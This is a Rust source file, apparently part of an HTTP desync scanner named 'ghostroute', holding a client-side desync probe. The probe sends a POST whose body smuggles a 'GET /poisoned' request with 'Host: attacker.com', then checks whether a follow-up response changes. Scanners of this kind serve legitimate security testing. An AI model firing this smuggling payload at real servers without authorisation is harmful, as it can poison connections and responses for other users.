use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    let baseline = h1::send_request(
        cfg,
        &h1::build_request("GET", "/", host, &[], b""),
        auth,
    ).await?;

    // Client-side desync (CSD):
    // Send a request that causes the CLIENT (browser) to desync from the server.
    // We simulate this by sending a request with Connection: keep-alive and a body
    // that the server partially reads, then observing if subsequent requests are affected.

    let smuggled = b"GET /poisoned HTTP/1.1\r\nHost: attacker.com\r\n\r\n";

    let mut request = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nConnection: keep-alive\r\nUser-Agent: ghostroute/1.0.0\r\nAccept: */*\r\n\r\n",
        host, smuggled.len()
    );

    if let Some(a) = auth {
        let mut bytes = request.into_bytes();
        a.apply_to_request(&mut bytes);
        request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::timeout;
    use std::time::Duration;

    let mut conn = crate::net::connect(cfg).await?;
    conn.write_all(request.as_bytes()).await.ok();
    conn.write_all(smuggled).await.ok();

    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf.len() > 1_000_000 { break; }
        if buf.len() > 100 && buf.windows(4).any(|w| w == b"\r\n\r\n") { break; }
    }
    let _first = h1::parse_response(&buf);

    // Send second request — if there's a client-side desync,
    // the response to the second request may contain the smuggled response
    let second_req = h1::build_request("GET", "/", host, &[], b"");
    conn.write_all(&second_req).await.ok();

    let mut buf2 = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf2.len() > 1_000_000 { break; }
    }

    let second = h1::parse_response(&buf2).unwrap_or_else(|_| baseline.clone());

    let vulnerable = second.body != baseline.body || second.status_code != baseline.status_code;

    let host_name = &cfg.host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "client-desync".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second.status_code,
        details: if vulnerable {
            Some("Client-side desync: connection state desynchronized".into())
        } else {
            None
        },
        ..Default::default()
    })
}
